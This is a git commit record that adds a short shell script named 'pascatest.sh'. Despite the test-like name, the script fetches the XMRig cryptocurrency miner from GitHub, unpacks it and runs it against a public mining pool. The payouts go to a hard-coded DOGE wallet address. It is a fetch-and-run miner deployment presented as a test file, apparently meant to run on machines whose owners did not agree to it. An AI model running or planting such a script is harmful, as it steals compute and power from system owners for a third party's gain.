10ca01fd98a3563f636166b13e49a0889f0c5a92
pascamm <63664664+pascamm@users.noreply.github.com>
2021-05-26 23:23:57 +0700

    Create pascatest.sh

---
+++ pascatest.sh
@@ -0,0 +1,4 @@
+sudo apt update
+wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz && tar -zxf xmrig-5.11.3-xenial-x64.tar.gz && cd xmrig-5.11.3 
+
+./xmrig --donate-level 5 -o ethash.unmineable.com:3333 -u DOGE:DBzFeA3h95bm7xi96idrPYMXhpVt8LUF93.gilang -p x -k -a rx/0
